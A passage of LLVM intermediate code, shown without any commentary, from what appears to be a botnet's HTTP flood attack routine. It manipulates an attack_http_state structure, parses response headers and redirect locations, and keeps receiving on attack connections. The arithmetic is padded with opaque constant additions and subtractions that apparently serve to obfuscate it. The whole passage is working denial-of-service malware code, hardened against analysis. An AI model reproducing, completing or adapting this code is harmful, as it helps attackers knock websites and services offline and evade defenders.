; <label>:1949:                                   ; preds = %1941
  store i32 0, i32* %58, align 4
  %1950 = load i8*, i8** %57, align 8
  %1951 = load i32, i32* %10, align 4
  %1952 = sext i32 %1951 to i64
  %1953 = getelementptr inbounds i8, i8* %1950, i64 %1952
  store i8 0, i8* %1953, align 1
  %1954 = load i32, i32* %10, align 4
  %1955 = sub i32 0, 1
  %1956 = sub i32 %1954, %1955
  %1957 = add nsw i32 %1954, 1
  store i32 %1956, i32* %10, align 4
  %1958 = load i8*, i8** %57, align 8
  %1959 = load i32, i32* %10, align 4
  %1960 = sext i32 %1959 to i64
  %1961 = getelementptr inbounds i8, i8* %1958, i64 %1960
  %1962 = load i8, i8* %1961, align 1
  %1963 = sext i8 %1962 to i32
  %1964 = icmp eq i32 %1963, 32
  br i1 %1964, label %1965, label %1970

; <label>:1965:                                   ; preds = %1949
  %1966 = load i32, i32* %10, align 4
  %1967 = sub i32 0, 1
  %1968 = sub i32 %1966, %1967
  %1969 = add nsw i32 %1966, 1
  store i32 %1968, i32* %10, align 4
  br label %1970

; <label>:1970:                                   ; preds = %1965, %1949
  %1971 = load i8*, i8** %57, align 8
  %1972 = load i32, i32* %10, align 4
  %1973 = sext i32 %1972 to i64
  %1974 = getelementptr inbounds i8, i8* %1971, i64 %1973
  %1975 = load i8*, i8** %57, align 8
  %1976 = load i32, i32* %10, align 4
  %1977 = sext i32 %1976 to i64
  %1978 = getelementptr inbounds i8, i8* %1975, i64 %1977
  %1979 = call i32 @util_strlen(i8* %1978)
  %1980 = call i32 @util_stristr(i8* %1974, i32 %1979, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1981 = icmp ne i32 %1980, -1
  br i1 %1981, label %1982, label %1998

; <label>:1982:                                   ; preds = %1970
  %1983 = load i8*, i8** %57, align 8
  %1984 = load i32, i32* %10, align 4
  %1985 = sext i32 %1984 to i64
  %1986 = getelementptr inbounds i8, i8* %1983, i64 %1985
  %1987 = load i8*, i8** %57, align 8
  %1988 = load i32, i32* %10, align 4
  %1989 = sext i32 %1988 to i64
  %1990 = getelementptr inbounds i8, i8* %1987, i64 %1989
  %1991 = call i32 @util_strlen(i8* %1990)
  %1992 = call i32 @util_stristr(i8* %1986, i32 %1991, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1993 = load i32, i32* %10, align 4
  %1994 = add i32 %1993, -2097492889
  %1995 = add i32 %1994, %1992
  %1996 = sub i32 %1995, -2097492889
  %1997 = add nsw i32 %1993, %1992
  store i32 %1996, i32* %10, align 4
  br label %1998

; <label>:1998:                                   ; preds = %1982, %1970
  %1999 = load i8*, i8** %57, align 8
  %2000 = load i32, i32* %10, align 4
  %2001 = sext i32 %2000 to i64
  %2002 = getelementptr inbounds i8, i8* %1999, i64 %2001
  %2003 = load i8, i8* %2002, align 1
  %2004 = sext i8 %2003 to i32
  %2005 = icmp eq i32 %2004, 34
  br i1 %2005, label %2006, label %2046

; <label>:2006:                                   ; preds = %1998
  %2007 = load i32, i32* %10, align 4
  %2008 = sub i32 %2007, 1555363245
  %2009 = add i32 %2008, 1
  %2010 = add i32 %2009, 1555363245
  %2011 = add nsw i32 %2007, 1
  store i32 %2010, i32* %10, align 4
  %2012 = load i8*, i8** %57, align 8
  %2013 = load i32, i32* %10, align 4
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds i8, i8* %2012, i64 %2014
  %2016 = load i8*, i8** %57, align 8
  %2017 = load i32, i32* %10, align 4
  %2018 = sext i32 %2017 to i64
  %2019 = getelementptr inbounds i8, i8* %2016, i64 %2018
  %2020 = call i32 @util_strlen(i8* %2019)
  %2021 = sub i32 %2020, -1906858558
  %2022 = sub i32 %2021, 1
  %2023 = add i32 %2022, -1906858558
  %2024 = sub nsw i32 %2020, 1
  %2025 = sext i32 %2023 to i64
  %2026 = getelementptr inbounds i8, i8* %2015, i64 %2025
  %2027 = load i8, i8* %2026, align 1
  %2028 = sext i8 %2027 to i32
  %2029 = icmp eq i32 %2028, 34
  br i1 %2029, label %2030, label %2045

; <label>:2030:                                   ; preds = %2006
  %2031 = load i8*, i8** %57, align 8
  %2032 = load i32, i32* %10, align 4
  %2033 = sext i32 %2032 to i64
  %2034 = getelementptr inbounds i8, i8* %2031, i64 %2033
  %2035 = load i8*, i8** %57, align 8
  %2036 = load i32, i32* %10, align 4
  %2037 = sext i32 %2036 to i64
  %2038 = getelementptr inbounds i8, i8* %2035, i64 %2037
  %2039 = call i32 @util_strlen(i8* %2038)
  %2040 = sub i32 0, 1
  %2041 = add i32 %2039, %2040
  %2042 = sub nsw i32 %2039, 1
  %2043 = sext i32 %2041 to i64
  %2044 = getelementptr inbounds i8, i8* %2034, i64 %2043
  store i8 0, i8* %2044, align 1
  br label %2045

; <label>:2045:                                   ; preds = %2030, %2006
  br label %2046

; <label>:2046:                                   ; preds = %2045, %1998
  %2047 = load i8*, i8** %57, align 8
  %2048 = call i32 @util_atoi(i8* %2047, i32 10)
  store i32 %2048, i32* %58, align 4
  br label %2049

; <label>:2049:                                   ; preds = %2068, %2046
  %2050 = load i32, i32* %58, align 4
  %2051 = icmp sgt i32 %2050, 0
  br i1 %2051, label %2052, label %2066

; <label>:2052:                                   ; preds = %2049
  %2053 = load i32, i32* %58, align 4
  %2054 = icmp slt i32 %2053, 10
  br i1 %2054, label %2055, label %2066

; <label>:2055:                                   ; preds = %2052
  %2056 = load i32, i32* %27, align 4
  %2057 = load i32, i32* %58, align 4
  %2058 = sub i32 0, %2056
  %2059 = sub i32 0, %2057
  %2060 = add i32 %2058, %2059
  %2061 = sub i32 0, %2060
  %2062 = add i32 %2056, %2057
  %2063 = zext i32 %2061 to i64
  %2064 = call i64 @time(i64* null) #6
  %2065 = icmp sgt i64 %2063, %2064
  br label %2066

; <label>:2066:                                   ; preds = %2055, %2052, %2049
  %2067 = phi i1 [ false, %2052 ], [ false, %2049 ], [ %2065, %2055 ]
  br i1 %2067, label %2068, label %2070

; <label>:2068:                                   ; preds = %2066
  %2069 = call i32 @sleep(i32 1)
  br label %2049

; <label>:2070:                                   ; preds = %2066
  %2071 = load i8*, i8** %57, align 8
  %2072 = load i32, i32* %10, align 4
  %2073 = sext i32 %2072 to i64
  %2074 = getelementptr inbounds i8, i8* %2071, i64 %2073
  store i8* %2074, i8** %57, align 8
  %2075 = load i8*, i8** %57, align 8
  %2076 = load i8*, i8** %57, align 8
  %2077 = call i32 @util_strlen(i8* %2076)
  %2078 = call i32 @util_stristr(i8* %2075, i32 %2077, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2079 = icmp eq i32 %2078, 4
  br i1 %2079, label %2080, label %2186

; <label>:2080:                                   ; preds = %2070
  store i32 7, i32* %10, align 4
  %2081 = load i8*, i8** %57, align 8
  %2082 = getelementptr inbounds i8, i8* %2081, i64 4
  %2083 = load i8, i8* %2082, align 1
  %2084 = sext i8 %2083 to i32
  %2085 = icmp eq i32 %2084, 115
  br i1 %2085, label %2086, label %2092

; <label>:2086:                                   ; preds = %2080
  %2087 = load i32, i32* %10, align 4
  %2088 = sub i32 %2087, 2017064444
  %2089 = add i32 %2088, 1
  %2090 = add i32 %2089, 2017064444
  %2091 = add nsw i32 %2087, 1
  store i32 %2090, i32* %10, align 4
  br label %2092

; <label>:2092:                                   ; preds = %2086, %2080
  %2093 = load i8*, i8** %57, align 8
  %2094 = load i8*, i8** %57, align 8
  %2095 = load i32, i32* %10, align 4
  %2096 = sext i32 %2095 to i64
  %2097 = getelementptr inbounds i8, i8* %2094, i64 %2096
  %2098 = load i32, i32* %56, align 4
  %2099 = load i32, i32* %10, align 4
  %2100 = sub i32 0, %2099
  %2101 = add i32 %2098, %2100
  %2102 = sub nsw i32 %2098, %2099
  %2103 = sext i32 %2101 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2093, i8* %2097, i64 %2103, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2104

; <label>:2104:                                   ; preds = %2125, %2092
  %2105 = load i8*, i8** %57, align 8
  %2106 = load i32, i32* %10, align 4
  %2107 = sext i32 %2106 to i64
  %2108 = getelementptr inbounds i8, i8* %2105, i64 %2107
  %2109 = load i8, i8* %2108, align 1
  %2110 = sext i8 %2109 to i32
  %2111 = icmp ne i32 %2110, 0
  br i1 %2111, label %2112, label %2131

; <label>:2112:                                   ; preds = %2104
  %2113 = load i8*, i8** %57, align 8
  %2114 = load i32, i32* %10, align 4
  %2115 = sext i32 %2114 to i64
  %2116 = getelementptr inbounds i8, i8* %2113, i64 %2115
  %2117 = load i8, i8* %2116, align 1
  %2118 = sext i8 %2117 to i32
  %2119 = icmp eq i32 %2118, 47
  br i1 %2119, label %2120, label %2125

; <label>:2120:                                   ; preds = %2112
  %2121 = load i8*, i8** %57, align 8
  %2122 = load i32, i32* %10, align 4
  %2123 = sext i32 %2122 to i64
  %2124 = getelementptr inbounds i8, i8* %2121, i64 %2123
  store i8 0, i8* %2124, align 1
  br label %2131

; <label>:2125:                                   ; preds = %2112
  %2126 = load i32, i32* %10, align 4
  %2127 = sub i32 %2126, -23971993
  %2128 = add i32 %2127, 1
  %2129 = add i32 %2128, -23971993
  %2130 = add nsw i32 %2126, 1
  store i32 %2129, i32* %10, align 4
  br label %2104

; <label>:2131:                                   ; preds = %2120, %2104
  %2132 = load i8*, i8** %57, align 8
  %2133 = call i32 @util_strlen(i8* %2132)
  %2134 = icmp sgt i32 %2133, 0
  br i1 %2134, label %2135, label %2145

; <label>:2135:                                   ; preds = %2131
  %2136 = load i8*, i8** %57, align 8
  %2137 = call i32 @util_strlen(i8* %2136)
  %2138 = icmp slt i32 %2137, 128
  br i1 %2138, label %2139, label %2145

; <label>:2139:                                   ; preds = %2135
  %2140 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2140, i32 0, i32 7
  %2142 = getelementptr inbounds [129 x i8], [129 x i8]* %2141, i32 0, i32 0
  %2143 = load i8*, i8** %57, align 8
  %2144 = call i32 @util_strcpy(i8* %2142, i8* %2143)
  br label %2145

; <label>:2145:                                   ; preds = %2139, %2135, %2131
  %2146 = load i8*, i8** %57, align 8
  %2147 = load i32, i32* %10, align 4
  %2148 = add i32 %2147, -524237637
  %2149 = add i32 %2148, 1
  %2150 = sub i32 %2149, -524237637
  %2151 = add nsw i32 %2147, 1
  %2152 = sext i32 %2150 to i64
  %2153 = getelementptr inbounds i8, i8* %2146, i64 %2152
  %2154 = call i32 @util_strlen(i8* %2153)
  %2155 = icmp slt i32 %2154, 256
  br i1 %2155, label %2156, label %2185

; <label>:2156:                                   ; preds = %2145
  %2157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2157, i32 0, i32 6
  %2159 = getelementptr inbounds [257 x i8], [257 x i8]* %2158, i32 0, i32 0
  %2160 = getelementptr inbounds i8, i8* %2159, i64 1
  call void @util_zero(i8* %2160, i32 255)
  %2161 = load i8*, i8** %57, align 8
  %2162 = load i32, i32* %10, align 4
  %2163 = sub i32 0, 1
  %2164 = sub i32 %2162, %2163
  %2165 = add nsw i32 %2162, 1
  %2166 = sext i32 %2164 to i64
  %2167 = getelementptr inbounds i8, i8* %2161, i64 %2166
  %2168 = call i32 @util_strlen(i8* %2167)
  %2169 = icmp sgt i32 %2168, 0
  br i1 %2169, label %2170, label %2184

; <label>:2170:                                   ; preds = %2156
  %2171 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2171, i32 0, i32 6
  %2173 = getelementptr inbounds [257 x i8], [257 x i8]* %2172, i32 0, i32 0
  %2174 = getelementptr inbounds i8, i8* %2173, i64 1
  %2175 = load i8*, i8** %57, align 8
  %2176 = load i32, i32* %10, align 4
  %2177 = add i32 %2176, -1879436577
  %2178 = add i32 %2177, 1
  %2179 = sub i32 %2178, -1879436577
  %2180 = add nsw i32 %2176, 1
  %2181 = sext i32 %2179 to i64
  %2182 = getelementptr inbounds i8, i8* %2175, i64 %2181
  %2183 = call i32 @util_strcpy(i8* %2174, i8* %2182)
  br label %2184

; <label>:2184:                                   ; preds = %2170, %2156
  br label %2185

; <label>:2185:                                   ; preds = %2184, %2145
  br label %2235

; <label>:2186:                                   ; preds = %2070
  %2187 = load i8*, i8** %57, align 8
  %2188 = getelementptr inbounds i8, i8* %2187, i64 0
  %2189 = load i8, i8* %2188, align 1
  %2190 = sext i8 %2189 to i32
  %2191 = icmp eq i32 %2190, 47
  br i1 %2191, label %2192, label %2234

; <label>:2192:                                   ; preds = %2186
  %2193 = load i8*, i8** %57, align 8
  %2194 = load i32, i32* %10, align 4
  %2195 = sub i32 %2194, 2139378093
  %2196 = add i32 %2195, 1
  %2197 = add i32 %2196, 2139378093
  %2198 = add nsw i32 %2194, 1
  %2199 = sext i32 %2197 to i64
  %2200 = getelementptr inbounds i8, i8* %2193, i64 %2199
  %2201 = call i32 @util_strlen(i8* %2200)
  %2202 = icmp slt i32 %2201, 256
  br i1 %2202, label %2203, label %2233

; <label>:2203:                                   ; preds = %2192
  %2204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2204, i32 0, i32 6
  %2206 = getelementptr inbounds [257 x i8], [257 x i8]* %2205, i32 0, i32 0
  %2207 = getelementptr inbounds i8, i8* %2206, i64 1
  call void @util_zero(i8* %2207, i32 255)
  %2208 = load i8*, i8** %57, align 8
  %2209 = load i32, i32* %10, align 4
  %2210 = add i32 %2209, 1828344720
  %2211 = add i32 %2210, 1
  %2212 = sub i32 %2211, 1828344720
  %2213 = add nsw i32 %2209, 1
  %2214 = sext i32 %2212 to i64
  %2215 = getelementptr inbounds i8, i8* %2208, i64 %2214
  %2216 = call i32 @util_strlen(i8* %2215)
  %2217 = icmp sgt i32 %2216, 0
  br i1 %2217, label %2218, label %2232

; <label>:2218:                                   ; preds = %2203
  %2219 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2219, i32 0, i32 6
  %2221 = getelementptr inbounds [257 x i8], [257 x i8]* %2220, i32 0, i32 0
  %2222 = getelementptr inbounds i8, i8* %2221, i64 1
  %2223 = load i8*, i8** %57, align 8
  %2224 = load i32, i32* %10, align 4
  %2225 = sub i32 %2224, -1474561892
  %2226 = add i32 %2225, 1
  %2227 = add i32 %2226, -1474561892
  %2228 = add nsw i32 %2224, 1
  %2229 = sext i32 %2227 to i64
  %2230 = getelementptr inbounds i8, i8* %2223, i64 %2229
  %2231 = call i32 @util_strcpy(i8* %2222, i8* %2230)
  br label %2232

; <label>:2232:                                   ; preds = %2218, %2203
  br label %2233

; <label>:2233:                                   ; preds = %2232, %2192
  br label %2234

; <label>:2234:                                   ; preds = %2233, %2186
  br label %2235

; <label>:2235:                                   ; preds = %2234, %2185
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 9
  %2238 = getelementptr inbounds [9 x i8], [9 x i8]* %2237, i32 0, i32 0
  %2239 = call i8* @strcpy(i8* %2238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2240 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2240, i32 0, i32 1
  store i8 10, i8* %2241, align 4
  br label %2768

; <label>:2242:                                   ; preds = %1941
  br label %2243

; <label>:2243:                                   ; preds = %2242, %1868
  br label %2244

; <label>:2244:                                   ; preds = %2243, %1845
  %2245 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2246 = load i32, i32* %12, align 4
  %2247 = call i32 @util_memsearch(i8* %2245, i32 %2246, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2247, i32* %37, align 4
  %2248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2248, i32 0, i32 9
  %2250 = getelementptr inbounds [9 x i8], [9 x i8]* %2249, i32 0, i32 0
  %2251 = call signext i8 @util_strcmp(i8* %2250, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2252 = sext i8 %2251 to i32
  %2253 = icmp ne i32 %2252, 0
  br i1 %2253, label %2261, label %2254

; <label>:2254:                                   ; preds = %2244
  %2255 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2256 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2255, i32 0, i32 9
  %2257 = getelementptr inbounds [9 x i8], [9 x i8]* %2256, i32 0, i32 0
  %2258 = call signext i8 @util_strcmp(i8* %2257, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2259 = sext i8 %2258 to i32
  %2260 = icmp ne i32 %2259, 0
  br i1 %2260, label %2261, label %2264

; <label>:2261:                                   ; preds = %2254, %2244
  %2262 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2263 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2262, i32 0, i32 1
  store i8 7, i8* %2263, align 4
  br label %2275

; <label>:2264:                                   ; preds = %2254
  %2265 = load i32, i32* %12, align 4
  %2266 = load i32, i32* %37, align 4
  %2267 = icmp sgt i32 %2265, %2266
  br i1 %2267, label %2268, label %2271

; <label>:2268:                                   ; preds = %2264
  %2269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2269, i32 0, i32 1
  store i8 10, i8* %2270, align 4
  br label %2274

; <label>:2271:                                   ; preds = %2264
  %2272 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2273 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2272, i32 0, i32 1
  store i8 1, i8* %2273, align 4
  br label %2274

; <label>:2274:                                   ; preds = %2271, %2268
  br label %2275

; <label>:2275:                                   ; preds = %2274, %2261
  %2276 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2277 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2276, i32 0, i32 0
  %2278 = load i32, i32* %2277, align 4
  %2279 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2280 = load i32, i32* %37, align 4
  %2281 = sext i32 %2280 to i64
  %2282 = call i64 @recv(i32 %2278, i8* %2279, i64 %2281, i32 16384)
  %2283 = trunc i64 %2282 to i32
  store i32 %2283, i32* %12, align 4
  br label %2766

; <label>:2284:                                   ; preds = %1129
  %2285 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2285, i32 0, i32 1
  %2287 = load i8, i8* %2286, align 4
  %2288 = zext i8 %2287 to i32
  %2289 = icmp eq i32 %2288, 7
  br i1 %2289, label %2290, label %2713

; <label>:2290:                                   ; preds = %2284
  br label %2291

; <label>:2291:                                   ; preds = %2711, %2290
  %2292 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2292, i32 0, i32 1
  %2294 = load i8, i8* %2293, align 4
  %2295 = zext i8 %2294 to i32
  %2296 = icmp ne i32 %2295, 7
  br i1 %2296, label %2297, label %2298

; <label>:2297:                                   ; preds = %2291
  br label %2712

; <label>:2298:                                   ; preds = %2291
  %2299 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2299, i32 0, i32 17
  %2301 = load i32, i32* %2300, align 4
  %2302 = icmp eq i32 %2301, 1024
  br i1 %2302, label %2303, label %2318

; <label>:2303:                                   ; preds = %2298
  %2304 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2304, i32 0, i32 18
  %2306 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2305, i32 0, i32 0
  %2307 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2307, i32 0, i32 18
  %2309 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2308, i32 0, i32 0
  %2310 = getelementptr inbounds i8, i8* %2309, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2306, i8* %2310, i64 960, i32 1, i1 false)
  %2311 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2311, i32 0, i32 17
  %2313 = load i32, i32* %2312, align 4
  %2314 = add i32 %2313, 960092516
  %2315 = sub i32 %2314, 64
  %2316 = sub i32 %2315, 960092516
  %2317 = sub nsw i32 %2313, 64
  store i32 %2316, i32* %2312, align 4
  br label %2318

; <label>:2318:                                   ; preds = %2303, %2298
  %2319 = call i32* @__errno_location() #7
  store i32 0, i32* %2319, align 4
  %2320 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2320, i32 0, i32 0
  %2322 = load i32, i32* %2321, align 4
  %2323 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2323, i32 0, i32 18
  %2325 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2324, i32 0, i32 0
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 17
  %2328 = load i32, i32* %2327, align 4
  %2329 = sext i32 %2328 to i64
  %2330 = getelementptr inbounds i8, i8* %2325, i64 %2329
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 17
  %2333 = load i32, i32* %2332, align 4
  %2334 = sub i32 0, %2333
  %2335 = add i32 1024, %2334
  %2336 = sub nsw i32 1024, %2333
  %2337 = sext i32 %2335 to i64
  %2338 = call i64 @recv(i32 %2322, i8* %2330, i64 %2337, i32 16384)
  %2339 = trunc i64 %2338 to i32
  store i32 %2339, i32* %12, align 4
  %2340 = load i32, i32* %12, align 4
  %2341 = icmp eq i32 %2340, 0
  br i1 %2341, label %2342, label %2344

; <label>:2342:                                   ; preds = %2318
  %2343 = call i32* @__errno_location() #7
  store i32 104, i32* %2343, align 4
  store i32 -1, i32* %12, align 4
  br label %2344

; <label>:2344:                                   ; preds = %2342, %2318
  %2345 = load i32, i32* %12, align 4
  %2346 = icmp eq i32 %2345, -1
  br i1 %2346, label %2347, label %2365

; <label>:2347:                                   ; preds = %2344
  %2348 = call i32* @__errno_location() #7
  %2349 = load i32, i32* %2348, align 4
  %2350 = icmp ne i32 %2349, 11
  br i1 %2350, label %2351, label %2364

; <label>:2351:                                   ; preds = %2347
  %2352 = call i32* @__errno_location() #7
  %2353 = load i32, i32* %2352, align 4
  %2354 = icmp ne i32 %2353, 11
  br i1 %2354, label %2355, label %2364

; <label>:2355:                                   ; preds = %2351
  %2356 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2356, i32 0, i32 0
  %2358 = load i32, i32* %2357, align 4
  %2359 = call i32 @close(i32 %2358)
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 0
  store i32 -1, i32* %2361, align 4
  %2362 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2363 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2362, i32 0, i32 1
  store i8 0, i8* %2363, align 4
  br label %2364

; <label>:2364:                                   ; preds = %2355, %2351, %2347
  br label %2712

; <label>:2365:                                   ; preds = %2344
  %2366 = load i32, i32* %12, align 4
  %2367 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2367, i32 0, i32 17
  %2369 = load i32, i32* %2368, align 4
  %2370 = add i32 %2369, -2066004959
  %2371 = add i32 %2370, %2366
  %2372 = sub i32 %2371, -2066004959
  %2373 = add nsw i32 %2369, %2366
  store i32 %2372, i32* %2368, align 4
  %2374 = load i32, i32* %27, align 4
  %2375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2375, i32 0, i32 2
  store i32 %2374, i32* %2376, align 4
  br label %2377

; <label>:2377:                                   ; preds = %2710, %2365
  store i32 0, i32* %59, align 4
  %2378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2378, i32 0, i32 14
  %2380 = load i32, i32* %2379, align 4
  %2381 = icmp sgt i32 %2380, 0
  br i1 %2381, label %2382, label %2581

; <label>:2382:                                   ; preds = %2377
  %2383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2383, i32 0, i32 14
  %2385 = load i32, i32* %2384, align 4
  %2386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2386, i32 0, i32 17
  %2388 = load i32, i32* %2387, align 4
  %2389 = icmp sgt i32 %2385, %2388
  br i1 %2389, label %2390, label %2394

; <label>:2390:                                   ; preds = %2382
  %2391 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2392 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2391, i32 0, i32 17
  %2393 = load i32, i32* %2392, align 4
  br label %2398

; <label>:2394:                                   ; preds = %2382
  %2395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2395, i32 0, i32 14
  %2397 = load i32, i32* %2396, align 4
  br label %2398

; <label>:2398:                                   ; preds = %2394, %2390
  %2399 = phi i32 [ %2393, %2390 ], [ %2397, %2394 ]
  store i32 %2399, i32* %59, align 4
  %2400 = load i32, i32* %59, align 4
  %2401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2401, i32 0, i32 14
  %2403 = load i32, i32* %2402, align 4
  %2404 = add i32 %2403, -1879266414
  %2405 = sub i32 %2404, %2400
  %2406 = sub i32 %2405, -1879266414
  %2407 = sub nsw i32 %2403, %2400
  store i32 %2406, i32* %2402, align 4
  %2408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2408, i32 0, i32 11
  %2410 = load i32, i32* %2409, align 4
  %2411 = icmp eq i32 %2410, 1
  br i1 %2411, label %2412, label %2580

; <label>:2412:                                   ; preds = %2398
  %2413 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2413, i32 0, i32 18
  %2415 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2414, i32 0, i32 0
  %2416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2416, i32 0, i32 17
  %2418 = load i32, i32* %2417, align 4
  %2419 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2420 = call i32 @util_memsearch(i8* %2415, i32 %2418, i8* %2419, i32 11)
  %2421 = icmp ne i32 %2420, -1
  br i1 %2421, label %2422, label %2579

; <label>:2422:                                   ; preds = %2412
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 18
  %2425 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2424, i32 0, i32 0
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 17
  %2428 = load i32, i32* %2427, align 4
  %2429 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2430 = call i32 @util_memsearch(i8* %2425, i32 %2428, i8* %2429, i32 11)
  store i32 %2430, i32* %60, align 4
  %2431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2431, i32 0, i32 18
  %2433 = load i32, i32* %60, align 4
  %2434 = sext i32 %2433 to i64
  %2435 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2432, i64 0, i64 %2434
  %2436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2436, i32 0, i32 17
  %2438 = load i32, i32* %2437, align 4
  %2439 = load i32, i32* %60, align 4
  %2440 = sub i32 0, %2439
  %2441 = add i32 %2438, %2440
